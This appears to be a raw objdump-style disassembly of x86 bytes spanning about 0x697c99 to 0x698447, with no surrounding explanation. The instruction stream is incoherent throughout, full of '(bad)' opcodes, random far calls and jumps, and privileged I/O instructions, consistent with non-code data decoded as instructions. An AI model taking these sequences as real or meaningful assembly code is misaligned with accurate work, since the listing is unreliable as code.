  697c99:	jb     0x697c74
  697c9b:	pushf  
  697c9c:	inc    esp
  697c9d:	sbb    eax,DWORD PTR [ebx]
  697c9f:	outs   dx,BYTE PTR ds:[esi]
  697ca0:	fisttp DWORD PTR [eax-0x4c3da588]
  697ca6:	shr    BYTE PTR [edx+esi*4],0xa8
  697caa:	lock (bad) 
  697cac:	iret   
  697cad:	nop
  697cae:	int3   
  697caf:	sahf   
  697cb0:	dec    ecx
  697cb1:	sbb    al,0x1f
  697cb3:	call   0x8475:0x5674d19c
  697cba:	cmp    BYTE PTR ds:0x98fa8710,ah
  697cc0:	aad    0x12
  697cc2:	jno    0x697c76
  697cc4:	jmp    0x7bd84abe
  697cc9:	js     0x697ca4
  697ccb:	and    bl,BYTE PTR [eax]
  697ccd:	sbb    BYTE PTR [eax+0xbce1357],ch
  697cd3:	sub    DWORD PTR [edi-0x3b],esi
  697cd6:	inc    esi
  697cd7:	mov    BYTE PTR [ebp+0x22b2ebae],ch
  697cdd:	and    BYTE PTR [ebp-0x5c],cl
  697ce0:	push   esp
  697ce1:	fbstp  TBYTE PTR [eax+0x41a669d5]
  697ce7:	stos   BYTE PTR es:[edi],al
  697ce8:	dec    esi
  697ce9:	xchg   bh,cl
  697ceb:	cmp    cl,BYTE PTR ds:0x81b23328
  697cf1:	aad    0x1c
  697cf3:	enter  0x51c9,0xc4
  697cf7:	jo     0x697cbf
  697cf9:	rcl    BYTE PTR [ecx-0x33cd4d5d],0x9e
  697d00:	xchg   ebp,eax
  697d01:	push   es
  697d02:	cmc    
  697d03:	(bad)  
  697d04:	push   esi
  697d05:	jnp    0x697ccc
  697d07:	into   
  697d08:	lods   al,BYTE PTR ds:[esi]
  697d09:	push   esp
  697d0a:	xor    ebx,DWORD PTR [ebp-0x45]
  697d0d:	pop    esp
  697d0e:	test   al,0x1f
  697d10:	jmp    0x697d4d
  697d12:	les    ebx,FWORD PTR [eax+0x56]
  697d15:	cld    
  697d16:	mov    esi,0x4af79755
  697d1b:	call   0xd452:0x9cd9405
  697d22:	cs mov cl,0x12
  697d25:	push   edx
  697d26:	or     eax,0x297ea831
  697d2b:	div    DWORD PTR [eax]
  697d2d:	inc    esp
  697d2e:	inc    ebp
  697d2f:	sbb    eax,DWORD PTR [ebx+edi*4]
  697d32:	dec    edx
  697d33:	mov    eax,0x71835099
  697d38:	sbb    BYTE PTR [eax+0x3ff1b53d],bh
  697d3e:	aaa    
  697d3f:	outs   dx,BYTE PTR ds:[esi]
  697d40:	hlt    
  697d41:	xor    DWORD PTR [ebp+0x41773ba7],esp
  697d47:	dec    eax
  697d48:	shr    DWORD PTR [edx],0x71
  697d4b:	dec    edi
  697d4c:	fstp   DWORD PTR [eax+0x79]
  697d4f:	or     al,0x5c
  697d51:	xor    edi,ebp
  697d53:	xchg   edi,eax
  697d54:	sbb    DWORD PTR [ebx-0x71],edx
  697d57:	imul   esi,DWORD PTR [edi-0x7984e446],0xa0ab2f20
  697d61:	pop    ds
  697d62:	stos   DWORD PTR es:[edi],eax
  697d63:	test   DWORD PTR [edx-0x3ccb1b0e],edi
  697d69:	jne    0x697de7
  697d6b:	call   0x873e8e14
  697d70:	mov    cl,0x86
  697d72:	or     BYTE PTR [esi],al
  697d74:	mov    cl,0xe7
  697d76:	jmp    0x85dcebb0
  697d7b:	inc    eax
  697d7c:	ss adc ebp,eax
  697d7f:	ret    0x5caa
  697d82:	jne    0x697d09
  697d84:	ret    
  697d85:	(bad)  
  697d86:	stos   DWORD PTR es:[edi],eax
  697d87:	loope  0x697d87
  697d89:	sbb    edx,DWORD PTR [edx+ebp*4]
  697d8c:	add    al,0xd5
  697d8e:	popf   
  697d8f:	push   0x48ae76d1
  697d94:	ins    BYTE PTR es:[edi],dx
  697d95:	push   ecx
  697d96:	sbb    bl,BYTE PTR [edx+0x66205736]
  697d9c:	test   DWORD PTR [ebx+0x105d5edb],edx
  697da2:	adc    eax,0xb842dbaf
  697da7:	ins    DWORD PTR es:[edi],dx
  697da8:	ins    DWORD PTR es:[edi],dx
  697da9:	and    cl,BYTE PTR [edx+0x7ac9a703]
  697daf:	dec    edx
  697db0:	xor    BYTE PTR [edi+eiz*1-0x3a],cl
  697db4:	adc    ah,BYTE PTR [edi]
  697db6:	adc    esp,ecx
  697db8:	inc    ebp
  697db9:	cmp    DWORD PTR [ecx-0x58],eax
  697dbc:	mov    ebp,0x582bdd3b
  697dc1:	mov    al,0xbb
  697dc3:	sub    al,0x7b
  697dc5:	add    ah,ch
  697dc7:	sub    BYTE PTR [eax],ah
  697dc9:	xchg   ebx,eax
  697dca:	clc    
  697dcb:	int    0x36
  697dcd:	xor    eax,0xdb3e41f0
  697dd2:	cmc    
  697dd3:	pop    es
  697dd4:	and    ebx,DWORD PTR [ebx-0x3b]
  697dd7:	xor    eax,esi
  697dd9:	sub    ecx,ebx
  697ddb:	sub    BYTE PTR [ebx],bl
  697ddd:	pop    eax
  697dde:	sbb    esi,DWORD PTR [ebx-0x52098796]
  697de4:	add    BYTE PTR [edi-0x3029f852],0x7f
  697deb:	div    dl
  697ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  697dee:	cmc    
  697def:	dec    ebp
  697df0:	lock dec edi
  697df2:	push   edi
  697df3:	iret   
  697df4:	fstp   st(5)
  697df6:	call   0xbdd2e458
  697dfb:	cld    
  697dfc:	pop    ebx
  697dfd:	out    0x23,al
  697dff:	addr16 call 0x89e8f310
  697e05:	ret    0x3e73
  697e08:	xor    al,cl
  697e0a:	enter  0x59c7,0xea
  697e0e:	je     0x697dbd
  697e10:	(bad)  
  697e11:	out    0xcb,al
  697e13:	inc    edi
  697e14:	inc    ebp
  697e15:	sub    DWORD PTR [ebx],ecx
  697e17:	nop    DWORD PTR [ebx-0x2608020d]
  697e1e:	mov    ecx,0xf5cc611b
  697e23:	mov    ebx,0xce38c6dd
  697e28:	pop    ebp
  697e29:	jg     0x697e18
  697e2b:	mov    edx,DWORD PTR [eax+0x22]
  697e2e:	add    al,BYTE PTR [ecx+edi*2+0x54]
  697e32:	nop
  697e33:	cld    
  697e34:	loop   0x697e01
  697e36:	cdq    
  697e37:	fadd   DWORD PTR [esi]
  697e39:	mov    esi,0x797804d6
  697e3e:	mov    ds:0x8b1170ff,al
  697e43:	stc    
  697e44:	adc    DWORD PTR ds:0xeb00a9c1,edx
  697e4a:	retf   
  697e4b:	xchg   BYTE PTR [edi-0x63],dl
  697e4e:	push   edi
  697e4f:	sub    eax,0x200880e3
  697e54:	daa    
  697e55:	mov    bh,0xb9
  697e57:	jl     0x697de4
  697e59:	pop    es
  697e5a:	jmp    0x697e8a
  697e5c:	jle    0x697ebb
  697e5e:	push   es
  697e5f:	sahf   
  697e60:	dec    eax
  697e61:	pop    ss
  697e62:	fmul   st(5),st
  697e64:	jae    0x697e48
  697e66:	outs   dx,BYTE PTR ds:[esi]
  697e67:	or     eax,0xd8d5ac88
  697e6c:	jo     0x697e3c
  697e6e:	fmulp  st(0),st
  697e70:	jno    0x697e18
  697e72:	mov    ebp,0xe8cd0adb
  697e77:	push   esp
  697e78:	dec    ecx
  697e79:	mov    edi,0x6ea1968f
  697e7e:	or     al,0xf2
  697e80:	jl     0x697ed8
  697e82:	or     bl,ch
  697e84:	mov    cl,0x59
  697e86:	icebp  
  697e87:	cwde   
  697e88:	mov    al,ds:0xd288e1a2
  697e8d:	cld    
  697e8e:	mov    WORD PTR [bp+si+0x64c0],gs
  697e93:	add    ebp,DWORD PTR [eax]
  697e95:	xchg   edx,eax
  697e96:	(bad)  
  697e97:	mov    cl,0x15
  697e99:	dec    edi
  697e9a:	bound  ebp,QWORD PTR [edx-0x26]
  697e9d:	push   ebx
  697e9e:	(bad)  
  697e9f:	in     al,0xb2
  697ea1:	cwde   
  697ea2:	mov    bl,BYTE PTR [esi]
  697ea4:	loop   0x697ebf
  697ea6:	add    dh,dl
  697ea8:	xchg   esp,eax
  697ea9:	xor    eax,DWORD PTR [ebx+0x3074f4a8]
  697eaf:	les    esi,FWORD PTR [esp+eax*4+0x69673bd6]
  697eb6:	xor    BYTE PTR es:[edx+eiz*4],dl
  697eba:	mov    eax,0xc1ef2613
  697ebf:	cmp    DWORD PTR [edx],ebp
  697ec1:	int3   
  697ec2:	mov    al,0x5c
  697ec4:	imul   edi,DWORD PTR [ecx],0x51965077
  697eca:	lock scas al,BYTE PTR es:[edi]
  697ecc:	fstp   DWORD PTR [esi-0x4e]
  697ecf:	shl    DWORD PTR [ecx],0xeb
  697ed2:	sbb    al,BYTE PTR [edx]
  697ed4:	fsubp  st(2),st
  697ed6:	(bad)  
  697ed9:	add    al,0x1f
  697edb:	xchg   esp,eax
  697edc:	mov    eax,0xadc20505
  697ee1:	add    eax,0x8106b638
  697ee6:	out    dx,eax
  697ee7:	cdq    
  697ee8:	scas   eax,DWORD PTR es:[edi]
  697ee9:	repnz mov al,ds:0x43977e19
  697eef:	xchg   ebx,eax
  697ef0:	(bad)  
  697ef1:	pop    ss
  697ef2:	or     BYTE PTR [ebp+eax*4-0x2c],al
  697ef6:	inc    edx
  697ef7:	ss and al,0xb
  697efa:	(bad)  
  697efb:	xor    eax,ebx
  697efd:	loopne 0x697ea0
  697eff:	push   0xac3fdf37
  697f04:	mov    ebx,0x86064963
  697f09:	push   ecx
  697f0a:	cmc    
  697f0b:	repz (bad) 
  697f0e:	mov    ebx,0x55d16b7b
  697f13:	rcl    BYTE PTR [edi],cl
  697f15:	lods   eax,DWORD PTR ds:[esi]
  697f16:	mov    edx,0xb35219d7
  697f1b:	out    dx,al
  697f1c:	bound  ebx,QWORD PTR [ecx+0x79]
  697f1f:	scas   al,BYTE PTR es:[edi]
  697f20:	(bad)  
  697f22:	test   eax,0xabd488ca
  697f27:	(bad)  
  697f29:	pop    ecx
  697f2a:	pop    es
  697f2b:	cmp    BYTE PTR [ebp-0x48],dh
  697f2e:	jle    0x697ecf
  697f30:	(bad)  
  697f31:	adc    ebx,ebx
  697f33:	inc    edx
  697f34:	adc    edx,ebp
  697f36:	scas   eax,DWORD PTR es:[edi]
  697f37:	sbb    BYTE PTR [eax-0x4bc6241d],0x80
  697f3e:	pop    edx
  697f3f:	jns    0x697ef1
  697f41:	mov    ecx,0x2dfa23e0
  697f46:	rcr    DWORD PTR [esi-0x42],cl
  697f49:	scas   eax,DWORD PTR es:[edi]
  697f4a:	(bad)  
  697f4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  697f4d:	mov    bh,BYTE PTR [ebx-0x3aaa1208]
  697f53:	push   edx
  697f54:	int3   
  697f55:	fs add al,0xb8
  697f58:	pop    ss
  697f59:	mov    esp,0xbfb4199c
  697f5e:	popa   
  697f5f:	add    dl,BYTE PTR [ebx]
  697f61:	dec    edx
  697f62:	enter  0x7eb0,0x20
  697f66:	xor    bh,BYTE PTR [ebp-0x35e0dcf6]
  697f6c:	mov    al,BYTE PTR [ebx+ebx*2-0x60]
  697f70:	push   0x3d
  697f72:	mov    ebp,0x7e01c340
  697f77:	push   eax
  697f78:	ins    DWORD PTR es:[edi],dx
  697f79:	(bad)  
  697f7a:	sub    al,0xd4
  697f7c:	add    BYTE PTR [ecx-0x25],ah
  697f7f:	out    0x5d,eax
  697f81:	adc    eax,esi
  697f83:	clc    
  697f84:	or     cl,cl
  697f86:	adc    ch,BYTE PTR [ebp+0x3b4e964]
  697f8c:	loopne 0x697f56
  697f8e:	outs   dx,DWORD PTR ds:[esi]
  697f8f:	gs iret 
  697f91:	cmp    eax,0xff112eb9
  697f96:	icebp  
  697f97:	sub    DWORD PTR [ecx],eax
  697f99:	mov    esi,0x4426cd88
  697f9e:	xor    ch,BYTE PTR [edi+0x41]
  697fa1:	daa    
  697fa2:	std    
  697fa3:	inc    ebp
  697fa4:	jl     0x697f76
  697fa6:	mov    bl,0x1
  697fa8:	rol    DWORD PTR [esp+esi*1-0x61],1
  697fac:	popf   
  697fad:	adc    dh,bh
  697faf:	sar    BYTE PTR [esi-0x66],1
  697fb2:	adc    BYTE PTR [edx+0x4a45e171],bh
  697fb8:	(bad)  
  697fb9:	sbb    al,0x7f
  697fbb:	dec    edx
  697fbc:	mov    al,BYTE PTR [edx-0x21495e00]
  697fc2:	int    0xfd
  697fc4:	enter  0xe747,0xb8
  697fc8:	mov    ecx,0x5b1caa17
  697fcd:	aaa    
  697fce:	shr    BYTE PTR [edx+0x13],0xac
  697fd2:	lods   eax,DWORD PTR ds:[esi]
  697fd3:	gs test al,0x8c
  697fd6:	fdiv   QWORD PTR [eax+0x19]
  697fd9:	or     DWORD PTR [ebp+0x7cba25c6],eax
  697fdf:	imul   esp,eax,0x48
  697fe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  697fe3:	dec    edx
  697fe4:	fsub   DWORD PTR [ebp-0x22]
  697fe7:	sbb    ebx,0x5ce1a7ff
  697fed:	ror    DWORD PTR [ebx],0xa7
  697ff0:	ror    DWORD PTR [edi+ebp*2+0x76],0xb7
  697ff5:	pop    ecx
  697ff6:	lds    ebx,FWORD PTR [edx-0x53]
  697ff9:	pop    esi
  697ffa:	imul   edi,DWORD PTR [edx],0x5648e4a3
  698000:	inc    edx
  698001:	mov    ebx,0xfd75cea
  698006:	cmp    edi,DWORD PTR [esi]
  698008:	bound  ecx,QWORD PTR [eax]
  69800a:	(bad)  
  69800c:	xlat   BYTE PTR ds:[ebx]
  69800d:	stos   BYTE PTR es:[edi],al
  69800e:	aad    0x2c
  698010:	cmp    DWORD PTR [ebp+0x5],eax
  698013:	cmp    BYTE PTR [eax+edi*8+0x1dc78848],al
  69801a:	mov    al,bl
  69801c:	fild   DWORD PTR [edx+0x5b5104be]
  698022:	sub    edx,ebx
  698024:	add    dl,BYTE PTR [eax+0x3a]
  698027:	adc    al,0xa2
  698029:	cmp    edi,DWORD PTR [esi-0x1a]
  69802c:	aaa    
  69802d:	mov    ebx,0x13e713bf
  698032:	cmp    eax,0x2bb9bb3c
  698037:	test   eax,0x42bacb21
  69803c:	xchg   ecx,eax
  69803d:	cwde   
  69803e:	xor    DWORD PTR [esi+0x715baa77],edi
  698044:	cli    
  698045:	jne    0x698028
  698047:	and    al,0x57
  698049:	mov    al,0xcf
  69804b:	push   ecx
  69804c:	mov    ecx,0xaacfd19a
  698051:	cmp    al,0xd2
  698053:	add    DWORD PTR [edi-0x26],ecx
  698056:	jg     0x69806a
  698058:	mov    esi,0xe80068cc
  69805d:	call   0x40c1:0x8f0717ce
  698064:	and    al,0x88
  698066:	jge    0x69807b
  698068:	cmp    edx,esp
  69806a:	shr    DWORD PTR [eax-0x58],1
  69806d:	shl    DWORD PTR [edx],0xc5
  698070:	sub    al,0xcc
  698072:	shr    BYTE PTR [ebx+0x4085da10],0xb1
  698079:	hlt    
  69807a:	outs   dx,BYTE PTR ds:[esi]
  69807b:	mov    al,ds:0xe16b7acc
  698080:	push   es
  698081:	hlt    
  698082:	ret    0xdb35
  698085:	leave  
  698086:	and    al,0x87
  698088:	dec    ebx
  698089:	inc    edi
  69808a:	(bad)  
  69808b:	adc    cl,BYTE PTR [ecx+0x1]
  69808e:	jle    0x698078
  698090:	or     eax,0x5ca77789
  698095:	aas    
  698096:	pop    ebx
  698097:	(bad)  
  698098:	jle    0x6980ad
  69809a:	pusha  
  69809b:	fwait
  69809c:	push   es
  69809d:	xor    eax,0x84cf1276
  6980a2:	in     eax,dx
  6980a3:	pop    esp
  6980a4:	dec    eax
  6980a5:	mov    dh,0x10
  6980a7:	dec    esi
  6980a8:	sbb    eax,DWORD PTR [ebp-0x4fd82ce6]
  6980ae:	pop    edi
  6980af:	jno    0x698034
  6980b1:	xchg   ebp,eax
  6980b2:	add    ah,BYTE PTR ds:0x2357e115
  6980b8:	cmp    DWORD PTR [eax-0x247dc397],ebp
  6980be:	shl    edi,1
  6980c0:	idiv   DWORD PTR ds:0xa2d5bdd0
  6980c6:	push   es
  6980c7:	xchg   ebp,eax
  6980c8:	in     al,0x16
  6980ca:	add    al,0x4d
  6980cc:	or     ebp,eax
  6980ce:	and    DWORD PTR ds:0xebfb8433,ebp
  6980d4:	mov    edx,0x65667293
  6980d9:	mov    bl,0x1b
  6980db:	das    
  6980dc:	test   DWORD PTR [ebx-0x7562f9dc],edx
  6980e2:	jmp    0x79e151f8
  6980e7:	push   edi
  6980e8:	lods   eax,DWORD PTR ds:[esi]
  6980e9:	shl    DWORD PTR [eax+0x36],cl
  6980ec:	jae    0x698096
  6980ee:	dec    edx
  6980ef:	sub    ch,bh
  6980f1:	xchg   esi,eax
  6980f2:	pop    esp
  6980f3:	(bad)  
  6980f4:	and    cl,al
  6980f6:	retf   
  6980f7:	pushf  
  6980f8:	xor    esp,eax
  6980fa:	retf   0xf7e5
  6980fd:	maxps  xmm4,XMMWORD PTR [ebp-0xc]
  698101:	dec    esp
  698102:	sti    
  698103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  698104:	xchg   esp,eax
  698105:	dec    esp
  698106:	jge    0x6980b7
  698108:	sub    BYTE PTR [esi-0x6c],ah
  69810b:	xor    cl,BYTE PTR [edx+0x30]
  69810e:	and    eax,0x97329f2b
  698113:	call   DWORD PTR [edx+0x31]
  698116:	(bad)  
  698117:	xor    cl,BYTE PTR [ecx]
  698119:	jo     0x698121
  69811b:	addr16 sbb eax,0xa49cc085
  698121:	dec    esp
  698122:	ror    DWORD PTR [esp+ecx*1],cl
  698125:	xchg   ebx,eax
  698126:	popf   
  698127:	push   eax
  698128:	dec    edi
  698129:	imul   esi,DWORD PTR [ebx+eax*8],0x2
  69812d:	sahf   
  69812e:	mov    bh,0xd8
  698130:	cmp    ebp,DWORD PTR [ebp+0x2e]
  698133:	ja     0x698190
  698135:	jge    0x6980be
  698137:	bound  ecx,QWORD PTR [ebp+0x2c]
  69813a:	int    0x52
  69813c:	enter  0x3adf,0x9e
  698140:	dec    esi
  698141:	mov    esp,0xb5562ea5
  698146:	mov    bl,dh
  698148:	mov    ebx,0x4e5fea86
  69814d:	mov    al,ds:0x956eab8f
  698152:	cmp    al,0x55
  698154:	and    al,0xc7
  698156:	popf   
  698157:	fmul   DWORD PTR [ecx+0x7f]
  69815a:	mov    al,ds:0x5c4a2fa0
  69815f:	mov    gs,WORD PTR [edi]
  698161:	inc    ebx
  698162:	fwait
  698163:	popa   
  698164:	dec    ebp
  698165:	dec    eax
  698166:	popf   
  698167:	pop    edi
  698168:	retf   
  698169:	(bad)  
  69816a:	cs ins DWORD PTR es:[edi],dx
  69816c:	and    al,0xa8
  69816e:	push   0x7f00b70f
  698173:	sbb    ecx,edi
  698175:	jge    0x6981f2
  698177:	ficomp WORD PTR [ebp+0x6671b823]
  69817d:	dec    edx
  69817e:	jge    0x6981ac
  698180:	jp     0x698125
  698182:	mov    ecx,fs
  698184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  698185:	inc    ecx
  698186:	sub    esp,ebp
  698188:	lods   al,BYTE PTR ds:[esi]
  698189:	test   DWORD PTR [eax+edi*2],ecx
  69818c:	sub    al,0x74
  69818e:	minps  xmm7,XMMWORD PTR [ecx]
  698191:	ret    
  698192:	aam    0x56
  698194:	pop    edi
  698195:	hlt    
  698196:	cld    
  698197:	jns    0x6981c2
  698199:	pop    esp
  69819a:	sbb    eax,0x6890dcd
  69819f:	xlat   BYTE PTR ds:[ebx]
  6981a0:	in     al,dx
  6981a1:	in     al,0x53
  6981a3:	mov    BYTE PTR [edx],0x5b
  6981a6:	mov    DWORD PTR [edi-0x1],esp
  6981a9:	(bad)  
  6981aa:	into   
  6981ab:	push   esi
  6981ac:	stc    
  6981ad:	gs mov ah,0x4
  6981b0:	adc    eax,0x43560a64
  6981b5:	xchg   ecx,eax
  6981b6:	ds out dx,al
  6981b8:	xor    BYTE PTR [eax+edx*8],cl
  6981bb:	push   ebp
  6981bc:	sub    DWORD PTR [edi+0x2d],ecx
  6981bf:	push   edx
  6981c0:	jmp    0x698167
  6981c2:	jp     0x6981f6
  6981c4:	rol    BYTE PTR [eax],1
  6981c6:	clc    
  6981c7:	adc    al,0x75
  6981c9:	pop    esp
  6981ca:	xchg   esp,eax
  6981cb:	xchg   ebx,eax
  6981cc:	jbe    0x698188
  6981ce:	push   edi
  6981cf:	inc    eax
  6981d0:	push   eax
  6981d1:	in     al,0x8a
  6981d3:	lock and eax,0x18da1550
  6981d9:	fld    TBYTE PTR [esi]
  6981db:	ins    BYTE PTR es:[edi],dx
  6981dc:	shl    DWORD PTR [ebx*4-0x12c1d278],1
  6981e3:	stc    
  6981e4:	mov    bh,0xc3
  6981e6:	mul    BYTE PTR [eax+0x70]
  6981e9:	mov    eax,ds:0xcce68965
  6981ee:	mov    al,ds:0x129f1ad8
  6981f3:	pop    esp
  6981f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6981f5:	ins    BYTE PTR es:[edi],dx
  6981f6:	fsub   st,st(7)
  6981f8:	mov    esp,0xeb344802
  6981fd:	imul   BYTE PTR [eax]
  6981ff:	add    ecx,DWORD PTR [eax-0x33f97c84]
  698205:	inc    eax
  698206:	ins    DWORD PTR es:[edi],dx
  698207:	int    0xdf
  698209:	jns    0x6981a2
  69820b:	stos   BYTE PTR es:[edi],al
  69820c:	mov    ecx,0xb0f97cc1
  698211:	addr16 push cs
  698213:	bound  eax,QWORD PTR [ecx+ebx*1+0x1d]
  698217:	(bad)  
  698218:	xor    bh,ch
  69821a:	and    al,0xe7
  69821c:	je     0x698210
  69821e:	mov    ch,0x60
  698220:	sub    esp,DWORD PTR [edi]
  698222:	mov    ds:0x753a6922,eax
  698227:	adc    ch,BYTE PTR [eax]
  698229:	icebp  
  69822a:	mov    ds:0xa236e214,al
  69822f:	lock cli 
  698231:	out    0xce,al
  698233:	test   BYTE PTR [edx],cl
  698235:	imul   ebx,DWORD PTR [ebp-0x25adc8eb],0xa8ff23a7
  69823f:	inc    edx
  698240:	inc    esp
  698241:	fldcw  WORD PTR ds:0x3a5bb290
  698247:	out    0xb7,al
  698249:	fiadd  WORD PTR [ecx+ecx*1+0x7779c238]
  698250:	sub    BYTE PTR [edx-0x484f669d],ah
  698256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  698257:	bound  edx,QWORD PTR [eax+edx*1-0x25]
  69825b:	jecxz  0x698293
  69825d:	cmp    edx,DWORD PTR [eax-0x6e]
  698260:	outs   dx,DWORD PTR ds:[esi]
  698261:	sti    
  698262:	clc    
  698263:	and    esi,DWORD PTR [ecx]
  698265:	cld    
  698266:	aas    
  698267:	push   es
  698268:	fadd   QWORD PTR [ebx+0x4b]
  69826b:	dec    eax
  69826c:	push   eax
  69826d:	mov    ch,0x2a
  69826f:	mov    al,ds:0xd34211f1
  698274:	gs popa 
  698276:	ret    0x2af7
  698279:	std    
  69827a:	ficomp WORD PTR [ecx-0xc]
  69827d:	mov    cl,bh
  69827f:	sub    al,0x23
  698281:	pop    eax
  698282:	mov    ds:0x53c8bcde,al
  698287:	lods   eax,DWORD PTR ds:[esi]
  698288:	sbb    BYTE PTR [ebp-0x73],bl
  69828b:	ss hlt 
  69828d:	bound  ebx,QWORD PTR [esi]
  69828f:	sti    
  698290:	mov    cl,0xd6
  698292:	sbb    ch,ah
  698294:	and    BYTE PTR [esi-0x29],ah
  698297:	aam    0x60
  698299:	jmp    edx
  69829b:	rol    BYTE PTR [eax+0x5c],cl
  69829e:	or     esp,DWORD PTR ds:0xe0047f18
  6982a4:	sbb    dl,dl
  6982a6:	stos   DWORD PTR es:[edi],eax
  6982a7:	aas    
  6982a8:	ins    DWORD PTR es:[edi],dx
  6982a9:	and    bl,al
  6982ab:	scas   al,BYTE PTR es:[edi]
  6982ac:	ret    0xafa5
  6982af:	cli    
  6982b0:	or     al,0x15
  6982b2:	pop    ecx
  6982b3:	enter  0x226f,0xf4
  6982b7:	addr16 inc eax
  6982b9:	arpl   cx,sp
  6982bb:	pusha  
  6982bc:	inc    ecx
  6982bd:	inc    esi
  6982be:	push   edx
  6982bf:	and    eax,0x78007ec2
  6982c4:	pop    eax
  6982c5:	mov    ah,0x41
  6982c7:	jno    0x69824a
  6982c9:	or     eax,0x5d370835
  6982ce:	(bad)  
  6982cf:	jno    0x698325
  6982d1:	push   eax
  6982d2:	or     bl,BYTE PTR [ebx+0x15]
  6982d5:	sub    al,bh
  6982d7:	xor    BYTE PTR [edx],ch
  6982d9:	sahf   
  6982da:	dec    edi
  6982db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6982dc:	mov    ch,0x18
  6982de:	xor    BYTE PTR [esi+0x20],0x34
  6982e2:	es icebp 
  6982e4:	mov    ecx,0x6f3f93f9
  6982e9:	push   es
  6982ea:	xchg   al,bl
  6982ec:	mov    edi,0xb5ddce3
  6982f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6982f2:	faddp  st(7),st
  6982f4:	push   es
  6982f5:	call   0xb6069504
  6982fa:	dec    eax
  6982fb:	call   0x61bfbf63
  698300:	daa    
  698301:	add    dh,dh
  698303:	jo     0x698331
  698305:	jl     0x698354
  698307:	bound  ebx,QWORD PTR [edi]
  698309:	iret   
  69830a:	push   ebp
  69830b:	inc    edi
  69830c:	ret    
  69830d:	pop    ds
  69830e:	fld    DWORD PTR [esi+0x1]
  698311:	fmul   QWORD PTR [eax-0x1]
  698314:	stc    
  698315:	sub    eax,0xa40d541d
  69831a:	(bad)  [ecx]
  69831c:	jg     0x69835b
  69831e:	imul   eax,DWORD PTR [edx],0x32c8b2db
  698324:	fnstenv [edi-0x67]
  698327:	jbe    0x3a8510e8
  69832d:	fld    DWORD PTR [ecx+eax*1-0x780b0d14]
  698334:	aad    0x9
  698336:	jno    0x698316
  698338:	loope  0x6982c4
  69833a:	inc    ebp
  69833b:	(bad)  [ebx-0x2156bb5c]
  698341:	(bad)  
  698342:	es hlt 
  698344:	aad    0x57
  698346:	ret    
  698347:	fdivr  st,st(2)
  698349:	dec    ebp
  69834a:	(bad)  
  69834b:	(bad)  [esi+0x4917ffa5]
  698351:	pop    ebx
  698352:	cmp    eax,0x4a487b24
  698357:	cli    
  698358:	or     eax,0x1f482b25
  69835d:	xchg   ecx,eax
  69835e:	rcr    DWORD PTR [eax+0xebb4049],0xd0
  698365:	adc    cl,dh
  698367:	push   edi
  698368:	xchg   ecx,eax
  698369:	jmp    0x69833e
  69836b:	push   es
  69836c:	(bad)  [esi]
  69836e:	icebp  
  69836f:	inc    ebx
  698370:	push   esi
  698371:	add    eax,0x6e4504d6
  698376:	imul   esi,DWORD PTR [ecx],0x5b
  698379:	add    DWORD PTR [esi+0xe],eax
  69837c:	mov    bh,0x46
  69837e:	pop    ss
  69837f:	(bad)  
  698380:	fwait
  698381:	popa   
  698382:	xchg   esp,eax
  698383:	retf   0x3243
  698386:	add    bl,BYTE PTR [eax-0x16]
  698389:	adc    BYTE PTR [ecx+ebx*4+0x42b2afe2],dh
  698390:	std    
  698391:	add    al,0xbe
  698393:	jp     0x6983d8
  698395:	pop    esp
  698396:	push   ecx
  698397:	stc    
  698398:	sbb    BYTE PTR ds:0xdacc96f6,0x7e
  69839f:	mov    bl,0xc6
  6983a1:	dec    esp
  6983a2:	dec    edi
  6983a3:	xor    ecx,DWORD PTR [eax]
  6983a5:	add    BYTE PTR [edi],0x9f
  6983a8:	push   ebp
  6983a9:	cmp    eax,0x5c5a5f1c
  6983ae:	outs   dx,BYTE PTR ds:[esi]
  6983af:	jne    0x69833b
  6983b1:	jmp    0x698428
  6983b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6983b4:	lds    eax,FWORD PTR [edx-0x17]
  6983b7:	adc    al,0x8a
  6983b9:	sahf   
  6983ba:	inc    ebx
  6983bb:	xor    BYTE PTR [ebx+esi*4-0x3],cl
  6983bf:	mov    eax,0x82740dad
  6983c4:	push   0x2ecd97a4
  6983c9:	(bad)  
  6983cb:	push   ecx
  6983cc:	xor    bh,bl
  6983ce:	call   0x31932a5b
  6983d3:	push   DWORD PTR [eax]
  6983d5:	sub    al,0xad
  6983d7:	shl    bh,cl
  6983d9:	sbb    BYTE PTR [edx+0x1b],0xf6
  6983dd:	repnz push 0xd61edae8
  6983e3:	pop    ebp
  6983e4:	mul    DWORD PTR [eax-0x6]
  6983e7:	aas    
  6983e8:	inc    edi
  6983e9:	pop    esi
  6983ea:	cmp    BYTE PTR [esi],0x34
  6983ed:	and    al,0xbe
  6983ef:	adc    al,0xea
  6983f1:	popa   
  6983f2:	cmp    al,0x7c
  6983f4:	call   0x8dee:0xdab90173
  6983fb:	jmp    0x6983ca
  6983fd:	arpl   bx,bx
  6983ff:	jae    0x69841a
  698401:	mov    cl,0xe0
  698403:	jp     0x698387
  698405:	push   esp
  698406:	cmp    al,0x2d
  698408:	inc    edi
  698409:	js     0x6983f2
  69840b:	in     al,dx
  69840c:	(bad)  
  69840d:	push   ds
  69840e:	jp     0x6983c4
  698410:	rcl    BYTE PTR [esi-0x21d3a2b],0xd5
  698417:	xchg   esp,eax
  698418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  698419:	inc    ecx
  69841a:	xchg   edi,eax
  69841b:	aas    
  69841c:	cdq    
  69841d:	inc    edi
  69841e:	cld    
  69841f:	dec    ebx
  698420:	jne    0x6983ce
  698422:	mov    eax,DWORD PTR [eax+edx*1-0xd]
  698426:	xor    al,BYTE PTR cs:[edi]
  698429:	aad    0x78
  69842b:	jnp    0x6983e0
  69842d:	adc    al,0xf6
  69842f:	repz adc DWORD PTR [ebp+0x3701fd71],ebx
  698436:	jg     0x69848f
  698438:	mov    eax,0xd76835b
  69843d:	in     eax,0x7f
  69843f:	or     DWORD PTR [edx-0x5e67ab66],edi
  698445:	test   dl,ah
  698447:	addr16 fwait
